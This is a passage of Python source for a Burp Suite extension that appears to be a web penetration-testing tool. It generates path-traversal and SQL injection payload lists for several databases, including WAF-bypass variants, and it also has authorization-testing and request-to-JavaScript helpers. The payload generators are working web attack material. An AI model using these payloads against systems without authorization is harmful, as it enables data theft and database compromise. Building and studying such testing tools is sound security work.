                            listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]).replace("..", _dots[i]) + "/" + filePath + suffix + "\n")
                            listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]).replace("..", _dots[i]) + suffix + "\n")
                            listLFI.append((_upperDirectory).replace("..", _dots[i]) + filePath + suffix + "\n")

            counter = counter + 1

        listLFI = list(set(listLFI))
        listLFI.sort(reverse=True)
        self._tabDictResultDisplay.setText(''.join(map(str, listLFI)))
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        clipboard.setContents(StringSelection(self._tabDictResultDisplay.getText()), None)
        self._lblStatusLabel.setText('Payload list for "' + self._txtTargetPath.text + '" path returns with '+ str(len(listLFI)) + ' result, and they have been copied to your clipboard. Please make sure payload encoding is disabled, unless you are sure what you are doing.') 
        return

    def funcSQLi(self, ev):
        self._lblStatusLabel.setForeground (Color.black)
        if self._cbTimeBased.isSelected() or self._cbStackedSQL.isSelected() or self._cbUnionBased.isSelected():
            if not self._cbMysqlBased.isSelected() and not self._cbMssqlBased.isSelected() and not self._cbPostgreBased.isSelected() and not self._cbOracleBased.isSelected():
                self._lblStatusLabel.setForeground (Color.red)
                self._lblStatusLabel.setText('Please pick a database!')
                self._tabDictResultDisplay.setText('')
                return
        if not (self._cbTimeBased.isSelected() or self._cbStackedSQL.isSelected() or self._cbUnionBased.isSelected() or self._cbBooleanBased.isSelected()):
                self._lblStatusLabel.setForeground (Color.red)
                self._lblStatusLabel.setText('Please pick an attack type!')
                self._tabDictResultDisplay.setText('')
                return

        listSQLi = []
        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "%0d%0a"]
        escapeChars = ["", "'", "''", "\\'"]
        if not self._cbSqlWafBypass.isSelected():
            prefixes = [""]
            escapeChars = ["", "'"]
        n1 = str(random.randint(10, 70))
        n2 = str(random.randint(71, 99))
        boolExpressions = [n1 + "=" + n1, n1 + "<" + n2]
        suffixes = ["", " -- -", ") -- -", ")) -- -", "))) -- -"]

        if self._cbBooleanBased.isSelected():
            for prefix in prefixes:
                for escapeChar in escapeChars:
                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                            continue
                    for boolExpression in boolExpressions:
                        for suffix in suffixes[1:]:
                            listSQLi.append(prefix + escapeChar + " or " + boolExpression + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + " or " + boolExpression + "\n")
            for prefix in prefixes:
                for escapeChar in escapeChars[1:]:
                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                            continue
                    
                    listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + "\n")
                    listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + "\n")
                    for suffix in suffixes[1:]:
                        listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
                        listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
                if self._cbPostgreBased.isSelected():
                    listSQLi.append(prefix + "$$ or $$xyz$$=$$xyz\n")
                    for suffix in suffixes[1:]:
                        listSQLi.append(prefix + "$$ or $$xyz$$=$$xyz$$" + suffix + "\n")
                        listSQLi.append(prefix + " or $$xyz$$=$$xyz$$" + suffix + "\n")

        unions = ["null", "1337", "'1337'"]
        if self._cbSqlWafBypass.isSelected():
            unions = ["null", "1337", "'1337'", "''1337''"]

        if self._cbUnionBased.isSelected():
            for prefix in prefixes:
                for escapeChar in escapeChars:
                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                            continue
                    for suffix in suffixes[1:]:
                        for union in unions:
                            unionPhrase = " union all select "
                            for i in range(int(self._cbUnionDepth.getSelectedItem())):
                                unionPhrase += union
                                if self._cbMysqlBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select sleep(60)") + suffix + "\n")
                                        if not escapeChar:
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select sleep(60)") + "\n")
                                if self._cbPostgreBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(60))") + suffix + "\n")
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select cast(pg_sleep(60) as text)") + suffix + "\n")
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select cast(pg_sleep(60) as integer)") + suffix + "\n")
                                        if not escapeChar:
                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(60))") + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select cast(pg_sleep(60) as text)") + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select cast(pg_sleep(60) as integer)") + "\n")
                                if self._cbMssqlBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        if escapeChar:
                                            listSQLi.append(prefix + escapeChar + unionPhrase + " waitfor delay " + escapeChar + "00:01" + escapeChar + suffix + "\n")
                                        else:
                                            listSQLi.append(prefix + unionPhrase + " waitfor delay '00:01'" + "\n")
                                            if self._cbSqlWafBypass.isSelected():
                                                listSQLi.append(prefix + unionPhrase + " waitfor delay \\'00:01\\'" + "\n")
                                                listSQLi.append(prefix + unionPhrase + " waitfor delay ''00:01''" + "\n")
                                if self._cbOracleBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + " from dual" + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + " from dual" + "\n")
                                    if self._cbTimeBased.isSelected():
                                        if escapeChar:
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)") + " from dual" + suffix + "\n")                                            
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,60)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as integer)") + " from dual" + suffix + "\n")
                                        else:
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(('a'),60)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(('a'),60)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,60)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,60)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),60) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),60) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),60) as varchar2(10))") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),60) as integer)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as varchar2(10))") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as integer)") + " from dual" + "\n")
                                            if self._cbSqlWafBypass.isSelected():
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((\\'a\\'),60)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((\\'a\\'),60)") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),60) as varchar2(10))") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),60) as integer)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),60) as varchar2(10))") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),60) as integer)") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((''a''),60)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((''a''),60)") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((''a''),60) as varchar2(10))") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((''a''),60) as integer)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((''a''),60) as varchar2(10))") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((''a''),60) as integer)") + " from dual" + "\n")
                                unionPhrase += ","

        for prefix in prefixes:
            for escapeChar in escapeChars:
                if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                        continue
                for suffix in suffixes[1:]:
                    if self._cbOracleBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select banner from v$version" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + ";select version from v$instance" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + ";select banner from v$version" + "\n")
                                listSQLi.append(prefix + ";select version from v$instance" + "\n")
                                listSQLi.append(prefix + ";select banner from v$version" + suffix + "\n")
                                listSQLi.append(prefix + ";select version from v$instance" + suffix + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60) else null end from dual " + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + "\n")
                                listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message(1,60) else null end from dual " + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message(1,60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,60)" + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message(1,60)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message(1,60)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message(1,60)" + "\n")
                            else:
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),60) else null end from dual" + suffix + "\n")
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),60) else null end from dual" + "\n")
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(1,60) else null end from dual" + suffix + "\n")
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(1,60) else null end from dual" + "\n")
                                if self._cbSqlWafBypass.isSelected():
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),60) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),60) else null end from dual" + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message(1,60) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message(1,60) else null end from dual" + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then ''a''||dbms_pipe.receive_message((''a''),60) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then ''a''||dbms_pipe.receive_message((''a''),60) else null end from dual" + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then ''a''||dbms_pipe.receive_message(1,60) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then ''a''||dbms_pipe.receive_message(1,60) else null end from dual" + "\n")
                    if self._cbMysqlBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + ";select @@version" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " or sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=(select 1337 from (select sleep(60))A)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=(select 1337 from (select sleep(60))A)" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + " and sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + " and sleep(60)" + "\n")
                                listSQLi.append(prefix + " or sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + " or sleep(60)" + "\n")
                                listSQLi.append(prefix + ";select sleep(60)" + "\n")
                                listSQLi.append(prefix + ";select sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from (select sleep(60))A)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from (select sleep(60))A)" + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from (select sleep(60))A)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from (select sleep(60))A)" + "\n")
                                listSQLi.append(prefix + "sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + "sleep(60)" + "\n")
                    if self._cbPostgreBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select version()" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + ";select version()" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select pg_sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " || pg_sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=(select 1337 from pg_sleep(60))" + suffix + "\n")                                    
                                listSQLi.append(prefix + escapeChar + " or 1337=(select 1337 from pg_sleep(60))" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + ";select pg_sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + ";select pg_sleep(60)" + "\n")
                                listSQLi.append(prefix + " || pg_sleep(60)" + "\n")
                                listSQLi.append(prefix + " || pg_sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from pg_sleep(60))" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from pg_sleep(60))" + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from pg_sleep(60))" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from pg_sleep(60))" + "\n")
                    if self._cbMssqlBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select @@version" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + " waitfor delay " + escapeChar + "00:01" + escapeChar + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + ";waitfor delay " + escapeChar + "00:01" + escapeChar + suffix + "\n")
                            else:
                                listSQLi.append(prefix + " waitfor delay '00:01'" + suffix + "\n")
                                listSQLi.append(prefix + " waitfor delay '00:01'" + "\n")
                                listSQLi.append(prefix + ";waitfor delay '00:01'" + suffix + "\n")
                                listSQLi.append(prefix + ";waitfor delay '00:01'" + "\n")
                                if self._cbSqlWafBypass.isSelected():
                                    listSQLi.append(prefix + " waitfor delay \\'00:01\\'" + suffix + "\n")
                                    listSQLi.append(prefix + " waitfor delay \\'00:01\\'" + "\n")
                                    listSQLi.append(prefix + ";waitfor delay \\'00:01\\'" + suffix + "\n")
                                    listSQLi.append(prefix + ";waitfor delay \\'00:01\\'" + "\n")
                                    listSQLi.append(prefix + " waitfor delay ''00:01''" + suffix + "\n")
                                    listSQLi.append(prefix + " waitfor delay ''00:01''" + "\n")
                                    listSQLi.append(prefix + ";waitfor delay ''00:01''" + suffix + "\n")
                                    listSQLi.append(prefix + ";waitfor delay ''00:01''" + "\n")
        listSQLi = list(set(listSQLi))
        listSQLi.sort()
        if self._cbSqlEncoding.isSelected():
            listSQLi = self.encodeURL(listSQLi)
        self._tabDictResultDisplay.setText(''.join(map(str, listSQLi)))
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        clipboard.setContents(StringSelection(self._tabDictResultDisplay.getText()), None)
        self._lblStatusLabel.setText('SQL Injection payload generation is returned with '+ str(len(listSQLi)) + ' records, and they have been copied to your clipboard!')
        return

    def encodeURL(self, payloads):
        urlList = []
        replacements = {
            " ": "%20", "\"": "%22", "\\": "%5c", "=": "%3d", "<": "%3c", ";": "%3b",
            "|": "%7c", "&": "%26", ":": "%3a", "`": "%60",
            "$": "%24", ",": "%2c"
        }
        for payload in payloads:
            for char, encoded_char in replacements.items():
                payload = payload.replace(char, encoded_char)
            urlList.append(payload)
        
        return urlList


    def getTabCaption(self):
        return "Agartha"

    def getUiComponent(self):
        return self._MainTabs

    def getHttpService(self):
        if self._MainTabs.getSelectedIndex() == 1:
            return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getHttpService()
        elif self._MainTabs.getSelectedIndex() == 2:
            return self._httpReqResAuthentication[self.tableMatrixAuthentication.getSelectedRow()][self.tableMatrixAuthentication.getSelectedColumn()].getHttpService()

    def getRequest(self):
        if self._MainTabs.getSelectedIndex() == 1:
            return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getRequest()
        elif self._MainTabs.getSelectedIndex() == 2:
            return self._httpReqResAuthentication[self.tableMatrixAuthentication.getSelectedRow()][self.tableMatrixAuthentication.getSelectedColumn()].getRequest()

    def getResponse(self):
        if self._MainTabs.getSelectedIndex() == 1:
            return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getResponse()
        elif self._MainTabs.getSelectedIndex() == 2:
            return self._httpReqResAuthentication[self.tableMatrixAuthentication.getSelectedRow()][self.tableMatrixAuthentication.getSelectedColumn()].getResponse()


    def createMenuItems(self, invocation):
        try:
            self.context = invocation
            menu_list = ArrayList()
            menu_list.add(JMenuItem("Auth Matrix", actionPerformed=self.agartha_menu))
            menu_list.add(JMenuItem("403 Bypass", actionPerformed=self.authentication_menu))
            menu_list.add(JMenuItem("Copy as JavaScript", actionPerformed=self.js_menu))
            return menu_list
        except:
            print("[ERROR] Context Menu Exception: " + str(sys.exc_info()[1]))
            return ArrayList()

    def js_menu(self, event):
        # right click menu
        try:
            clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
            http_contexts = self.context.getSelectedMessages()
            _req = self._helpers.bytesToString(http_contexts[0].getRequest())
            _url = str(self._helpers.analyzeRequest(http_contexts[0]).getUrl())

            if _url.startswith("https"):
                _url = _url.replace(":443/", "/")
            elif _url.startswith("http"):
                _url = _url.replace(":80/", "/")
    
            method = _req.splitlines()[0].split(" ", 1)[0]
    
            if "]" in _req.splitlines()[-1][-1:] or "}" in _req.splitlines()[-1][-1:] or ">" in _req.splitlines()[-1][-1:]:
                jscript = "JSON/XML is not supported yet :/"
            else:
                fullHeader = ""
                for _reqLine in _req.splitlines()[1:-1]:
                    if _reqLine and not any(re.findall(r'(cookie|token|auth|content-length)(.*:)', _reqLine, re.IGNORECASE)):
                        fullHeader += "xhr.setRequestHeader('" + _reqLine.split(":", 1)[0].strip() + "','" + _reqLine.split(":", 1)[1].strip() + "');"
    
                if method == "GET":
                    minHeader = "var xhr=new XMLHttpRequest();xhr.open('GET','" + _url + "');xhr.withCredentials=true;"
                    jscript = "Http request with minimum header paramaters in JavaScript:\n\t<script>" + minHeader + "xhr.send();</script>\n\n"
                    jscript += "Http request with all header paramaters (except cookies, tokens, etc) in JavaScript, you may need to remove unnecessary fields:\n\t<script>" + minHeader + fullHeader + "xhr.send();</script>"
                else:
                    contentType = ""
                    for _reqLine in _req.splitlines():
                        if any(re.findall(r'Content-type', _reqLine, re.IGNORECASE)):
                            contentType = "xhr.setRequestHeader('Content-type','" + _reqLine.split(" ", 1)[1].strip() + "');"
                            break                    
                    
                    sendData = ""
                    if _req.splitlines()[-1].strip():
                        sendData = "'" + _req.splitlines()[-1] + "'"
                    
                    minHeader = "var xhr=new XMLHttpRequest();xhr.open('" + method + "','" + _url + "');xhr.withCredentials=true;"
                    jscript = "Http request with minimum header paramaters in JavaScript:\n\t<script>" + minHeader + contentType.strip() + "xhr.send(" + sendData + ");</script>\n\n"
                    jscript += "Http request with all header paramaters (except cookies, tokens, etc) in JavaScript, you may need to remove unnecessary fields:\n\t<script>" + minHeader + fullHeader + "xhr.send(" + sendData + ");</script>"
                jscript += "\n\nFor redirection, please also add this code before '</script>' tag:\n\txhr.onreadystatechange=function(){if (this.status===302){var location=this.getResponseHeader('Location');return ajax.call(this,location);}};"
        except:
            jscript = "An error has occurred during the conversion from HTTP to JavaScript: " + str(sys.exc_info()[1])
        
        clipboard.setContents(StringSelection(jscript), None)

    def agartha_menu(self, event):
        # right click menu
        http_contexts = self.context.getSelectedMessages()
        _req = self._helpers.bytesToString(http_contexts[0].getRequest())
        _url = ""
        for http_context in http_contexts:
            _url += str(self._helpers.analyzeRequest(http_context).getUrl()) + "\n"

        if _url.startswith("https"):
            _url = _url.replace(":443/", "/")
        elif _url.startswith("http"):
            _url = _url.replace(":80/", "/")
        
        self._tbAuthHeader.setText(_req)
        self._tbAuthHeader.setSelectionStart(0)
        self._tbAuthHeader.setSelectionEnd(0)
        self._tbAuthURL.setText(_url)
        self._tbAuthURL.setSelectionStart(0)
        self._tbAuthURL.setSelectionEnd(0)
        self._MainTabs.setSelectedComponent(self._tabAuthSplitpane)
        self._MainTabs.getParent().setSelectedComponent(self._MainTabs)

        return

    def authentication_menu(self, event):
        # right click menu
        http_contexts = self.context.getSelectedMessages()
        try:
            for http_context in http_contexts:
                _url = str(self._helpers.analyzeRequest(http_context).getUrl())
                if _url.count('http') >=2:
                    # the url is already redirected to somewhere
                    continue
                if _url.startswith("https"):
                    _url = _url.replace(":443/", "/")
                elif _url.startswith("http"):
                    _url = _url.replace(":80/", "/")
                _header = self._helpers.analyzeRequest(http_context).getHeaders()
                _body = self._helpers.bytesToString(http_context.getRequest()[self._helpers.analyzeRequest(http_context).getBodyOffset():])

                self.tableMatrixAuthentication_DM.addRow([_url])
                self._urlAddresses.addElement(_url)
                self.authenticationMatrix.append([_url, _header, _body])

                self._btnAuthenticationRun.setEnabled(True)
                self._MainTabs.setSelectedComponent(self._tabAuthenticationSplitpane)
                self._MainTabs.getParent().setSelectedComponent(self._MainTabs)

            self.tabAuthenticationJlist.setSelectedIndex(0)
            self._lblAuthenticationNotification.text = "The request has been added to the table with all session identifiers. Blank is default color and different colors are for warning levels."
        except:
            self._lblAuthenticationNotification.text = "An error has occurred: " + str(sys.exc_info()[1])
        return

    def authMatrix(self, ev):
        t = Thread(target=self.authMatrixThread, args=[self])
        t.start()
        return

    def _updateReqResView(self, ev):
        try:
            row = self.tableMatrix.getSelectedRow()
            userID = self.tableMatrix.getSelectedColumn()
            if userID == 0:
                self._requestViewer.setMessage("", False)
                self._responseViewer.setMessage("", False)
            else:
                self._requestViewer.setMessage(self.httpReqRes[userID-1][row].getRequest(), False)
                self._responseViewer.setMessage(self.httpReqRes[userID-1][row].getResponse(), False)
        except:
            self._requestViewer.setMessage("", False)
            self._responseViewer.setMessage("", False)
    
    def isURLValid(self, urlAdd):
        if (urlparse.urlparse(urlAdd) and urlAdd.strip().startswith("http") and not " " in urlAdd.strip()) or urlAdd.isspace() or not urlAdd:
            return True
        else:
            return False

    def _tabAuthUI(self):
        # panel top
        self._tbAuthNewUser = JTextField("", 14)
        self._tbAuthNewUser.setToolTipText("Please provide an username.")
        self._btnAuthNewUserAdd = JButton("Add User", actionPerformed=self.authAdduser)
        self._btnAuthNewUserAdd.setPreferredSize(Dimension(90, 27))
        self._btnAuthNewUserAdd.setToolTipText("Please add user/s to populate role matrix!")
        self._btnAuthRun = JButton("RUN", actionPerformed=self.authMatrix)
        self._btnAuthRun.setPreferredSize(Dimension(150, 27))
        self._btnAuthRun.setToolTipText("Execute the task!")
        self._btnSiteMapGeneratorRun = JButton("Spider", actionPerformed=self.siteMapGenerator)
        self._btnSiteMapGeneratorRun.setPreferredSize(Dimension(90, 27))
        self._btnSiteMapGeneratorRun.setToolTipText("It crawls all the links the user can visit and populate URL list automatically.")
        self._btnAuthReset = JButton("Reset", actionPerformed=self.tableMatrixReset)
        self._btnAuthReset.setPreferredSize(Dimension(90, 27))
        self._btnAuthReset.setToolTipText("Clear all.")
        self._btnAuthRun.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._tbAuthHeader = JTextPane()
        self._tbAuthHeader.setContentType("text")
        self._tbAuthHeader.setToolTipText("HTTP header belongs to the user. You can set up this field from right click: 'Extensions > Agartha > Authorization Matrix'.")
        self._tbAuthHeader.setEditable(True)
        self._tbAuthURL = JTextPane()
        self._tbAuthURL.setContentType("text")
        self._tbAuthURL.setToolTipText("URL paths can be accessible by the user. Please dont forget to remove logout links!")
        self._tbAuthURL.setEditable(True)
        self._cbAuthColoring = JCheckBox('Warnings', True, itemStateChanged=self._cbAuthColoringFunc)
        self._cbAuthColoring.setEnabled(True)
        self._cbAuthColoring.setToolTipText("Colors may help to a better analysis.")
        self._cbAuthGETPOST = JComboBox(('GET', 'POST', 'Dynamic'))
        self._cbAuthGETPOST.setSelectedIndex(2)
        self._cbAuthGETPOST.setToolTipText("Which HTTP method will be used for the test. Dynamic takes proxy history as reference.")

